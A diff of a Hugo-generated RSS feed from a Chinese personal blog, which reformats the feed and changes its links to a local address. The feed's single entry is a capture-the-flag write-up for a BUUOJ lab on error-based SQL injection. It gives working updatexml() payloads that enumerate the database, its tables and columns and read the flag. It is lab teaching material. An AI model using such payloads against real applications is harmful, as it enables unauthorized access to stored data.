@@ -1,31 +1,24 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>BUUOJ on 东阳的个人站点</title><link>https://Samantha09.github.io/san-blog/tags/buuoj/</link><description>Recent content in BUUOJ on 东阳的个人站点</description><generator>Hugo</generator><language>zh-cn</language><lastBuildDate>Mon, 01 Jun 2026 22:00:00 +0800</lastBuildDate><atom:link href="https://Samantha09.github.io/san-blog/tags/buuoj/index.xml" rel="self" type="application/rss+xml"/><item><title>[BUUOJ] SQL COURSE 1</title><link>https://Samantha09.github.io/san-blog/posts/buuoj-sql-course-1/</link><pubDate>Mon, 01 Jun 2026 22:00:00 +0800</pubDate><guid>https://Samantha09.github.io/san-blog/posts/buuoj-sql-course-1/</guid><description>&lt;h2 id="题目信息"&gt;题目信息&lt;/h2&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;类型&lt;/strong&gt;：Web / SQL 注入&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;靶场&lt;/strong&gt;：BUUOJ&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;核心漏洞&lt;/strong&gt;：报错注入（Error-based SQL Injection）&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;目标&lt;/strong&gt;：通过报错注入读取数据库中的 flag&lt;/li&gt;
-&lt;/ul&gt;
-&lt;hr&gt;
-&lt;h2 id="漏洞分析"&gt;漏洞分析&lt;/h2&gt;
-&lt;p&gt;页面存在 SQL 注入点，输入单引号后数据库返回报错信息。通过 &lt;code&gt;updatexml()&lt;/code&gt; 函数构造报错，可以将查询结果带出。&lt;/p&gt;
-&lt;hr&gt;
-&lt;h2 id="利用步骤"&gt;利用步骤&lt;/h2&gt;
-&lt;h3 id="1-确认报错注入"&gt;1. 确认报错注入&lt;/h3&gt;
-&lt;p&gt;构造 payload 测试报错注入是否可行：&lt;/p&gt;
-&lt;pre tabindex="0"&gt;&lt;code&gt;id=1&amp;#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1)%23
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="../../images/buu-sql-course-1/step1-error-based-sql.png" alt="确认报错注入"&gt;&lt;/p&gt;
-&lt;p&gt;回显中出现 &lt;code&gt;~geek~&lt;/code&gt;，确认当前数据库名为 &lt;code&gt;geek&lt;/code&gt;。&lt;/p&gt;
-&lt;h3 id="2-查表名"&gt;2. 查表名&lt;/h3&gt;
-&lt;p&gt;从 &lt;code&gt;information_schema.tables&lt;/code&gt; 中查询当前库的所有表名：&lt;/p&gt;
-&lt;pre tabindex="0"&gt;&lt;code&gt;id=1&amp;#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)%23
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="../../images/buu-sql-course-1/step2-table-name.png" alt="查询表名"&gt;&lt;/p&gt;
-&lt;h3 id="3-查列名"&gt;3. 查列名&lt;/h3&gt;
-&lt;p&gt;锁定目标表后，查询表中的列名：&lt;/p&gt;
-&lt;pre tabindex="0"&gt;&lt;code&gt;id=1&amp;#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&amp;#39;目标表名&amp;#39;),0x7e),1)%23
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="../../images/buu-sql-course-1/step3-column-name.png" alt="查询列名"&gt;&lt;/p&gt;
-&lt;h3 id="4-读取-flag"&gt;4. 读取 flag&lt;/h3&gt;
-&lt;p&gt;拿到列名后，直接查询 flag 字段：&lt;/p&gt;
-&lt;pre tabindex="0"&gt;&lt;code&gt;id=1&amp;#39; and updatexml(1,concat(0x7e,(select group_concat(flag) from 目标表名),0x7e),1)%23
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="../../images/buu-sql-course-1/step4-get-flag.png" alt="读取 flag"&gt;&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;&lt;code&gt;updatexml&lt;/code&gt; 的报错输出有长度限制（约 32 字符），如果 flag 较长，需要用 &lt;code&gt;substr()&lt;/code&gt; 分段读取。&lt;/p&gt;</description></item></channel></rss>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+	<channel>
+		<title>BUUOJ on 东阳的个人站点</title>
+		<link>http://127.0.0.1:1313/san-blog/tags/buuoj/</link>
+		<description>Recent content in BUUOJ on 东阳的个人站点</description>
+		<generator>Hugo</generator>
+		<language>zh-cn</language>
+		
+		
+		
+		
+			<lastBuildDate>Mon, 01 Jun 2026 22:00:00 +0800</lastBuildDate>
+		
+			<atom:link href="http://127.0.0.1:1313/san-blog/tags/buuoj/index.xml" rel="self" type="application/rss+xml" />
+			<item>
+				<title>[BUUOJ] SQL COURSE 1</title>
+				<link>http://127.0.0.1:1313/san-blog/posts/buuoj-sql-course-1/</link>
+				<pubDate>Mon, 01 Jun 2026 22:00:00 +0800</pubDate>
+				<guid>http://127.0.0.1:1313/san-blog/posts/buuoj-sql-course-1/</guid>
+				<description>&lt;h2 id=&#34;题目信息&#34;&gt;题目信息&lt;/h2&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;类型&lt;/strong&gt;：Web / SQL 注入&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;靶场&lt;/strong&gt;：BUUOJ&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;核心漏洞&lt;/strong&gt;：报错注入（Error-based SQL Injection）&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;目标&lt;/strong&gt;：通过报错注入读取数据库中的 flag&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;hr&gt;&#xA;&lt;h2 id=&#34;漏洞分析&#34;&gt;漏洞分析&lt;/h2&gt;&#xA;&lt;p&gt;页面存在 SQL 注入点，输入单引号后数据库返回报错信息。通过 &lt;code&gt;updatexml()&lt;/code&gt; 函数构造报错，可以将查询结果带出。&lt;/p&gt;&#xA;&lt;hr&gt;&#xA;&lt;h2 id=&#34;利用步骤&#34;&gt;利用步骤&lt;/h2&gt;&#xA;&lt;h3 id=&#34;1-确认报错注入&#34;&gt;1. 确认报错注入&lt;/h3&gt;&#xA;&lt;p&gt;构造 payload 测试报错注入是否可行：&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;id=1&amp;#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1)%23&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;../../images/buu-sql-course-1/step1-error-based-sql.png&#34; alt=&#34;确认报错注入&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;回显中出现 &lt;code&gt;~geek~&lt;/code&gt;，确认当前数据库名为 &lt;code&gt;geek&lt;/code&gt;。&lt;/p&gt;&#xA;&lt;h3 id=&#34;2-查表名&#34;&gt;2. 查表名&lt;/h3&gt;&#xA;&lt;p&gt;从 &lt;code&gt;information_schema.tables&lt;/code&gt; 中查询当前库的所有表名：&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;id=1&amp;#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)%23&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;../../images/buu-sql-course-1/step2-table-name.png&#34; alt=&#34;查询表名&#34;&gt;&lt;/p&gt;&#xA;&lt;h3 id=&#34;3-查列名&#34;&gt;3. 查列名&lt;/h3&gt;&#xA;&lt;p&gt;锁定目标表后，查询表中的列名：&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;id=1&amp;#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&amp;#39;目标表名&amp;#39;),0x7e),1)%23&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;../../images/buu-sql-course-1/step3-column-name.png&#34; alt=&#34;查询列名&#34;&gt;&lt;/p&gt;&#xA;&lt;h3 id=&#34;4-读取-flag&#34;&gt;4. 读取 flag&lt;/h3&gt;&#xA;&lt;p&gt;拿到列名后，直接查询 flag 字段：&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;id=1&amp;#39; and updatexml(1,concat(0x7e,(select group_concat(flag) from 目标表名),0x7e),1)%23&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;../../images/buu-sql-course-1/step4-get-flag.png&#34; alt=&#34;读取 flag&#34;&gt;&lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;&lt;code&gt;updatexml&lt;/code&gt; 的报错输出有长度限制（约 32 字符），如果 flag 较长，需要用 &lt;code&gt;substr()&lt;/code&gt; 分段读取。&lt;/p&gt;</description>
+			</item>
+	</channel>
+</rss>
